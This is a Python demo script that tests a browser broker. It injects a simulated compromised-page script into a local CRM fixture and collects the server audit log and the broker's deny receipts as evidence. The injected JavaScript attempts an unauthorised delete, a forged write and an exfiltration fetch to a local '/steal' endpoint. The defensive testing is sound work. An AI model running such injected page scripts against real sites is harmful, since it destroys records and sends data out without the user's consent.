#!/usr/bin/env python3
"""Capture hostile-page audit log for the creative demo."""
import json, os, subprocess, sys, time, tempfile, urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
PORT = 8711
ORIGIN = f"http://127.0.0.1:{PORT}"
tmp = Path(tempfile.mkdtemp(prefix="ruse-demo-audit-"))
audit_file = tmp / "crm-audit.jsonl"

env = dict(os.environ, CRM_PORT=str(PORT), CRM_AUDIT=str(audit_file))
fixture = subprocess.Popen(
    [sys.executable, str(ROOT / "fixtures" / "crm_fixture.py")],
    env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
)

# Wait for fixture
for _ in range(50):
    try:
        urllib.request.urlopen(f"{ORIGIN}/", timeout=1)
        break
    except Exception:
        time.sleep(0.1)

sys.path.insert(0, str(ROOT))
from broker import Broker

broker = Broker(str(tmp / "data"))

# Connect under lease
conn = broker._invoke(
    "connect",
    str(ROOT / "leases" / "crm.json"),
    str(tmp / "credentials.json"),
)
print("connect:", conn)

# Navigate to customer 123
broker._invoke("navigate", "/contacts/123")

# Inject hostile page script (simulates compromised page)
ATTACK_JS = """
(async () => {
  const out = [];
  const tryReq = async (name, req) => {
    try { const r = await fetch(req); out.push(name + ':HTTP' + r.status); }
    catch (e) { out.push(name + ':BLOCKED'); }
  };
  await tryReq('delete-123', new Request('/api/contacts/123', {method: 'DELETE'}));
  await tryReq('write-999', new Request('/api/contacts/999', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({status: 'deleted'})}));
  await tryReq('exfil', new Request('http://127.0.0.1:8719/steal', {mode: 'no-cors'}));
  document.title = 'ATTACKS:' + out.join('|');
})();
"""
broker._invoke("evaluate", ATTACK_JS)
time.sleep(3)

# Get server-side audit log — the judge
audit = json.loads(urllib.request.urlopen(f"{ORIGIN}/_audit", timeout=5).read())
print("\n=== CRM SERVER-SIDE AUDIT LOG ===")
print(json.dumps(audit, indent=2))

# Get receipts
receipts = broker._invoke("receipts", 100)
print("\n=== RUSE RECEIPTS ===")
for r in (receipts if isinstance(receipts, list) else receipts.get("receipts", [])):
    if r.get("event") == "deny":
        print(f"  DENY: {r.get('method')} {r.get('url')} — {r.get('rule')} — {r.get('reason')}")
    elif r.get("event") == "commit":
        print(f"  COMMIT: {r.get('method')} {r.get('url')} — status {r.get('status')} — verified: {r.get('verified')}")

broker._invoke("revoke")
fixture.terminate()

# Save evidence for the demo
evidence = {
    "audit": audit,
    "receipts": receipts if isinstance(receipts, list) else receipts.get("receipts", []),
}
with open("/tmp/ruse-demo-evidence.json", "w") as f:
    json.dump(evidence, f, indent=2)
print("\nEvidence saved to /tmp/ruse-demo-evidence.json")
